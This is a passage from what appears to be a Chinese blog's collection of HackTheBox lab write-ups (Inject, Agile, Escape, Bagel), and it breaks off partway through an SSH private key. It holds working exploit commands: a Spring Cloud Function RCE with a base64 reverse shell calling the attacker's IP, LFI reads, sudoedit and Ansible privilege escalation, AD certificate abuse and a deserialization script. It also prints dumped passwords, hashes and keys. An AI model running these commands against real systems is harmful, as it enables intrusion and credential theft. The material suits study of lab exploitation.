10.10.11.204 端口扫描22和8080: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.204Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 11:15 CSTNmap scan report for 10.10.11.204Host is up (0.10s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)| 256 d51c81c97b076b1cc1b429254b52219f (ECDSA)|_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)8080/tcp open nagios-nsca Nagios NSCA|_http-open-proxy: Proxy might be redirecting requests|_http-title: HomeService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds 8080一个类似云盘的东西： LFI简单测试上传查看，发现可能存在LFI： 验证存在： 并且可以直接查看目录： /home/frank/.m2/settings.xml读文件，得到phil的密码： 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;$&#123;user.home&#125;/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt;&lt;/settings&gt; 但并不能直接直接SSH登录 pom.xml找到应用目录，读取pom，发现存在漏洞的组件： me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963https://github.com/me2nuk/CVE-2022-22963 CVE-2022-22963测试存在： 1curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")' --data-raw 'data' -v exploitJava runtime exec需要编码处理，得到frank用户 shell 12345bash -i &amp;&gt;/dev/tcp/10.10.14.4/4444 &lt;&amp;1bash -c &#123;echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;curl -X POST http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash -c &#123;echo,YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCA8JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\")' --data-raw 'data' -v user flag现在可以使用密码切换到phil用户，得到user flag: 提权信息定期使用ansible运行指定目录下的playbook，原本的playbok我们没有权限，但我们在staff组中，对tasks目录有写权限，所以可以直接创建新的： 提权 &amp; root flag自定义一个playbook执行任意命令，等待触发： miao.yml123456- hosts: localhost tasks: - name: PE ansible.builtin.shell: | chmod +s /bin/bash become: true shadow123root:$6$KeHoGfvAPeHOqplu$tC&#x2F;4gh419crGM6.btFzCazMPFH0gaX.x&#x2F;Qp.PJZCoizg4wYcl48wtOGA3lwxNjooq9MDzJZJvzav7V37p9aMT1:19381:0:99999:7:::frank:$6$fBwyjkLHtSuUCpHx$6G9LujV0iop.QxbfQpwDcSaRWDDobBlVMo5.6gVJVnQabcbmFwdkwFfmJNAX27u3Cdg9ZO5977pCst7hF98kc&#x2F;:19381:0:99999:7:::phil:$6$Z.KhzrHH6PXCuNbO$dL9xyMTydwjYPcrunZb7OO9a0hCwrUPOeQfdum818rW4NPtsiXEji15NMmikgYBGLDbWPUfLIpCpOuCRxYedM.:19388:0:99999:7::: 参考资料 me2nuk/CVE-2022-22963: Spring Cloud Function Vulnerable Application / CVE-2022-22963https://github.com/me2nuk/CVE-2022-22963 Inject - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Inject-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Agile - HackTheBox","slug":"Agile-HackTheBox","date":"2023-03-06T01:08:50.000Z","updated":"2023-08-07T01:49:50.421Z","comments":true,"path":"2023/03/06/Agile-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/03/06/Agile-HackTheBox/","excerpt":"","text":"基本信息 10.10.11.203 端口扫描22和80： 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.203Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 21:42 CSTNmap scan report for 10.10.11.203Host is up (0.090s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)|_ 256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://superpass.htb|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 48.64 seconds 80需要加hosts： 110.10.11.203 superpass.htb 在线密码管理器： SuperPasswordLFI注册登录，简单的测试功能，发现导出功能存在LFI： 构造不正确信息例如简单的一个点，报错信息中得到应用目录： app.pyflask应用，那直接读app.py,得到SECRET_KEY： 1app.config[&#39;SECRET_KEY&#39;] &#x3D; &#39;MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD&#39; vault_views.py12corum5db7caa1d13cc37c9fc2 查看代码发现’/vault/row/&lt;id&gt;‘接口，简单的遍历在8中得到corum的agile密码： user flag得到的账号密码登录，得到user flag： Port 5555简单的枚举发现5555端口在本机运行，转发出来访问,应该是同样应用的测试版： 1ssh -L 127.0.0.1:5555:127.0.0.1:5555 corum@10.10.11.203 edwards用和生产环境同样的方法得到edwards的密码： 12edwardsd07867c6267dcb5df0af 提权信息edwards有以dev_admin运行sudoedit的权限： 搜索可以发现相关漏洞,但我们需要根据当前配置情况手动利用,作者特意做了些限制： CVE - CVE-2023-22809https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809 n3m1dotsys/CVE-2023-22809-sudoedit-privesc: A script to automate privilege escalation with CVE-2023-22809 vulnerabilityhttps://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc 提权 &amp; root flag通过环境变量来编辑其他文件，例如当前环境中venv相关文件,： 12export EDITOR=\"vim -- /app/venv/bin/activate\"sudo -u dev_admin sudoedit /app/config_test.json 在activate文件中添加命令，例如给bash加suid，等待自动执行： shadow123root:$y$j9T$aVz0UjJ8lKXB0U&#x2F;ishNnn.$xjtp7fGYHDgeqSVAgoF8scjYgJ.SG7HoSCsxL7&#x2F;Pie.:19382:0:99999:7:::corum:$y$j9T$OGDuj.6PoMVUi2isIxr1m&#x2F;$XmaKi6K.1aQwDSQA5A9N3amFEu4P8j4f8wvnku3SrB6:19382:0:99999:7:::edwards:$y$j9T$Ys32s08M6KOz1HkP3T52x.$loCNh19xW9yMvjznJ52qtZqsPvWylaIHV2cNFIxdXA5:19382:0:99999:7::: 参考资料 CVE - CVE-2023-22809https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809 n3m1dotsys/CVE-2023-22809-sudoedit-privesc: A script to automate privilege escalation with CVE-2023-22809 vulnerabilityhttps://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc Agile - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Agile-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Escape - HackTheBox","slug":"Escape-HackTheBox","date":"2023-02-28T08:01:50.000Z","updated":"2023-06-19T01:02:26.844Z","comments":true,"path":"2023/02/28/Escape-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/02/28/Escape-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/531 10.10.11.202 端口扫描windows域靶机，还有445，1433： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$ nmap -sC -sV -Pn 10.10.11.202Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-28 14:57 CSTNmap scan report for 10.10.11.202Host is up (0.081s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-28 14:58:09Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after: 2023-11-18T21:20:35|_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after: 2023-11-18T21:20:35|_ssl-date: 2023-02-28T14:59:30+00:00; +8h00m01s from scanner time.1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM|_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time.|_ms-sql-info: ERROR: Script execution failed (use -d to debug)|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: 2023-02-28T14:54:27|_Not valid after: 2053-02-28T14:54:273268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-02-28T14:59:31+00:00; +8h00m00s from scanner time.| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after: 2023-11-18T21:20:353269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=dc.sequel.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb| Not valid before: 2022-11-18T21:20:35|_Not valid after: 2023-11-18T21:20:35|_ssl-date: 2023-02-28T14:59:30+00:00; +8h00m01s from scanner time.Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s| smb2-security-mode:| 311:|_ Message signing enabled and required| smb2-time:| date: 2023-02-28T14:58:53|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 139.60 seconds SMBsmb匿名访问，public里得到一个pdf： 123smbclient -N -L 10.10.11.202smbclient -N //10.10.11.202/Publicget \"SQL Server Procedures.pdf\" SQL Server Procedures.pdfpdf中给出了mssql的账号密码： 12PublicUserGuestUserCantWrite1 MSSQL使用得到的账号密码连接： 1impacket-mssqlclient PublicUser:GuestUserCantWrite1@10.10.11.202 常规responder+xp_dirtree得到sql_svc hash： 123sudo python3 Responder.py -i 10.10.14.9 -vSQL&gt; exec xp_dirtree '\\\\10.10.14.9\\miao' 破解出来密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtREGGIE1234ronnie (sql_svc) sql_svc使用得到的密码登录,现在还不是user： 1evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie 翻文件发现C:\\SQLServer\\logs中有一个日志文件，其中得到另一个用户的账号密码，模拟的是使用用户账号密码登录数据库被记录到日志中的场景： 12sequel.htb\\Ryan.CooperNuclearMosquito3 user flag使用sql日志中得到的账号密码登录，桌面得到user flag： 1evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3 ADCS提权部分是adcs，可以使用certipy远程进行： ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abusehttps://github.com/ly4k/Certipy 发现脆弱的证书模板： 12345certipy find -vulnerable -stdout -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202Template Name : UserAuthenticationDisplay Name : UserAuthenticationCertificate Authorities : sequel-DC-CA ESC1直接根据文档里的ESC1利用方式一步步来即可得到administrator的NTLM hash： 12345678certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -target 10.10.11.202 -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb -dns 10.10.11.202 -dc-ip 10.10.11.202# auth时可能会报错时钟偏移问题，先ntp同步时间sudo ntpdate -s 10.10.11.202certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.202[*] Got NT hash for 'administrator@sequel.htb': a52f78e4c751e5f5e17e1e9f3e58f4ee root flag使用得到的hash登录： 1evil-winrm -i 10.10.11.202 -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE 参考资料 ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abusehttps://github.com/ly4k/Certipy Writeup Escape HackTheBoxhttps://gatogamer1155.github.io/htb/escape/ Escape - HTB [Discussion] | BreachForumshttps://breached.vc/Thread-Escape-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bagel - HackTheBox","slug":"Bagel-HackTheBox","date":"2023-02-20T11:59:49.000Z","updated":"2023-06-05T00:53:39.099Z","comments":true,"path":"2023/02/20/Bagel-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/02/20/Bagel-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/530 10.10.11.201 端口扫描22,5000,8000,5000直接HTTP访问是400: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152$ nmap -sC -sV -Pn 10.10.11.201Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 18:56 CSTNmap scan report for 10.10.11.201Host is up (0.093s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.8 (protocol 2.0)| ssh-hostkey:| 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA)|_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519)5000/tcp open upnp?| fingerprint-strings:| GetRequest:| HTTP/1.1 400 Bad Request| Server: Microsoft-NetCore/2.0| Date: Mon, 20 Feb 2023 10:57:02 GMT| Connection: close| HTTPOptions:| HTTP/1.1 400 Bad Request| Server: Microsoft-NetCore/2.0| Date: Mon, 20 Feb 2023 10:57:17 GMT| Connection: close| Help, SSLSessionReq, TLSSessionReq, TerminalServerCookie:| HTTP/1.1 400 Bad Request| Content-Type: text/html| Server: Microsoft-NetCore/2.0| Date: Mon, 20 Feb 2023 10:57:28 GMT| Content-Length: 52| Connection: close| Keep-Alive: true| &lt;h1&gt;Bad Request (Invalid request line (parts).)&lt;/h1&gt;| RTSPRequest:| HTTP/1.1 400 Bad Request| Content-Type: text/html| Server: Microsoft-NetCore/2.0| Date: Mon, 20 Feb 2023 10:57:02 GMT| Content-Length: 54| Connection: close| Keep-Alive: true|_ &lt;h1&gt;Bad Request (Invalid request line (version).)&lt;/h1&gt;8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9| fingerprint-strings:| FourOhFourRequest:| HTTP/1.1 404 NOT FOUND| Server: Werkzeug/2.2.2 Python/3.10.9| Date: Mon, 20 Feb 2023 10:57:02 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 207| Connection: close| &lt;!doctype html&gt;| &lt;html lang=en&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest:| HTTP/1.1 302 FOUND| Server: Werkzeug/2.2.2 Python/3.10.9| Date: Mon, 20 Feb 2023 10:56:57 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 263| Location: http://bagel.htb:8000/?page=index.html| Connection: close| &lt;!doctype html&gt;| &lt;html lang=en&gt;| &lt;title&gt;Redirecting...&lt;/title&gt;| &lt;h1&gt;Redirecting...&lt;/h1&gt;| &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=\"http://bagel.htb:8000/?page=index.html\"&gt;http://bagel.htb:8000/?page=index.html&lt;/a&gt;. If not, click the link.| Socks5:| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"| \"http://www.w3.org/TR/html4/strict.dtd\"&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request syntax ('| ').&lt;/p&gt;| &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;|_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html|_http-server-header: Werkzeug/2.2.2 Python/3.10.92 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port5000-TCP:V=7.93%I=7%D=2/20%Time=63F351FE%P=x86_64-apple-darwin21.5.SF:0%r(GetRequest,73,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20MicSF:rosoft-NetCore/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202023\\x2010:57:02\\xSF:20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,E8,\"HTTP/1\\.1\\x20SF:400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20MicroSF:soft-NetCore/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202023\\x2010:57:02\\x20SF:GMT\\r\\nContent-Length:\\x2054\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20SF:true\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(verSF:sion\\)\\.\\)&lt;/h1&gt;\")%r(HTTPOptions,73,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\SF:r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202SF:023\\x2010:57:17\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(Help,E6,\"HTTSF:P/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServerSF::\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202023\\x2010SF::57:28\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-SF:Alive:\\x20true\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20linSF:e\\x20\\(parts\\)\\.\\)&lt;/h1&gt;\")%r(SSLSessionReq,E6,\"HTTP/1\\.1\\x20400\\x20Bad\\xSF:20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCoreSF:/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202023\\x2010:57:28\\x20GMT\\r\\nConteSF:nt-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\nSF:&lt;h1&gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)&lt;/h1SF:&gt;\")%r(TerminalServerCookie,E6,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCoSF:ntent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\SF:x20Mon,\\x2020\\x20Feb\\x202023\\x2010:57:28\\x20GMT\\r\\nContent-Length:\\x205SF:2\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n&lt;h1&gt;Bad\\x20RequSF:est\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)&lt;/h1&gt;\")%r(TLSSessioSF:nReq,E6,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/htSF:ml\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\xSF:202023\\x2010:57:28\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20clSF:ose\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Request\\x20\\(Invalid\\x20reSF:quest\\x20line\\x20\\(parts\\)\\.\\)&lt;/h1&gt;\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port8000-TCP:V=7.93%I=7%D=2/20%Time=63F351F9%P=x86_64-apple-darwin21.5.SF:0%r(GetRequest,1EA,\"HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\SF:.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Mon,\\x2020\\x20Feb\\x202023\\x2010:56SF::57\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-LSF:ength:\\x20263\\r\\nLocation:\\x20http://bagel\\.htb:8000/\\?page=index\\.htmlSF:\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\nSF:&lt;title&gt;Redirecting\\.\\.\\.&lt;/title&gt;\\n&lt;h1&gt;Redirecting\\.\\.\\.&lt;/h1&gt;\\n&lt;p&gt;You\\x2SF:0should\\x20be\\x20redirected\\x20automatically\\x20to\\x20the\\x20target\\x20SF:URL:\\x20&lt;a\\x20href=\\\"http://bagel\\.htb:8000/\\?page=index\\.html\\\"&gt;http:/SF:/bagel\\.htb:8000/\\?page=index\\.html&lt;/a&gt;\\.\\x20If\\x20not,\\x20click\\x20theSF:\\x20link\\.\\n\")%r(FourOhFourRequest,184,\"HTTP/1\\.1\\x20404\\x20NOT\\x20FOUNSF:D\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Mon,\\x2SF:020\\x20Feb\\x202023\\x2010:57:02\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x2SF:0charset=utf-8\\r\\nContent-Length:\\x20207\\r\\nConnection:\\x20close\\r\\n\\r\\SF:n&lt;!doctype\\x20html&gt;\\n&lt;html\\x20lang=en&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/titSF:le&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not\\x2SF:0found\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\xSF:20manually\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20agaiSF:n\\.&lt;/p&gt;\\n\")%r(Socks5,213,\"&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\SF:x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\"http://www\\.wSF:3\\.org/TR/html4/strict\\.dtd\\\"&gt;\\n&lt;html&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x2SF:0\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\\"Content-Type\\\"\\x20contenSF:t=\\\"text/html;charset=utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;title&gt;SF:Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;boSF:dy&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20response&lt;/h1&gt;\\n\\x20\\xSF:20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\x2SF:0\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20request\\x20syntax\\x20\\('\\\\x05\\\\xSF:04\\\\x00\\\\x01\\\\x02\\\\x80\\\\x05\\\\x01\\\\x00\\\\x03'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\xSF:20\\x20\\x20\\x20&lt;p&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUESF:ST\\x20-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.&lt;/pSF:&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 126.81 seconds 8000需要加hosts,访问之就有个page参数，很大可能LFI： 110.10.11.201 bagel.htb LFI没任何过滤的LFI： 后续就是LFI获取信息 /proc/self/cmdline读取cmdline可以发现是python flask应用： /home/developer/app/app.py读取app.py发现5000端口是order app的websocket，并且有注释说忘了用dotnet运行对应的dll，使用ssh密钥访问机器： order app遍历pid找到order app对应的进程，得到dll路径： bagel.dllbagel.dll下载下来分析： 1http:&#x2F;&#x2F;bagel.htb:8000&#x2F;?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;bagel&#x2F;bin&#x2F;Debug&#x2F;net6.0&#x2F;bagel.dll DBDB里得到数据库账号密码： 1Data Source&#x3D;ip;Initial Catalog&#x3D;Orders;User ID&#x3D;dev;Password&#x3D;k8wdAYYKyhnjg3K 反序列化翻代码也能看到很明显的反序列化： OrdersOrders中ReadOrder函数存在过滤，RemoveOrder是一个object,可以被利用来反序列化： Json.Net反序列化参考： .NET高级代码审计（第二课） Json.Net反序列化漏洞-安全客 - 安全资讯平台https://www.anquanke.com/post/id/172920 利用RemoveOrder反序列化调用File的ReadFile： 得到phil的ssh私钥 exp.py12345678import json,websocketws = websocket.WebSocket() ws.connect(\"ws://10.10.11.201:5000/\") # connect to order apporder = &#123; \"RemoveOrder\" : &#123;\"$type\":\"bagel_server.File, bagel\", \"ReadFile\":\"../../../../../../home/phil/.ssh/id_rsa\"&#125;&#125;data = str(json.dumps(order))ws.send(data)result = ws.recv()print(result) phil_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2s8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T&#x2F;iePRZOBf5CW3gZapHh+mNOrSZk13F28NdZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS&#x2F;&#x2F;bAMtyHkNn3n9cg7ZrhufiYCkg9jBjOZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR&#x2F;I+saVvj8KgoYtDCE1sVVftUZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3&#x2F;klYq6g3l+NEZOCM0&#x2F;I+30oaBoXCjvupMswiY&#x2F;oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfTeYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha&#x2F;A8UhvLqYA6PfruLEMxJVoDpmvvn9yFWxU1YvkqYaIdirOtX&#x2F;h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB3NzaC1yc2EAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpiGBA93O2kgvAu+BZr0g8U7TTnd0&#x2F;4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmymsiH3BvEKZCD236sF4SkfqgrH6kv&#x2F;2wDLch5DZ95&#x2F;XIO2a4bn4mApIPYwYzmS+Pq8OFMlrDjbE3b4perZXONT18hEyWrenUx0h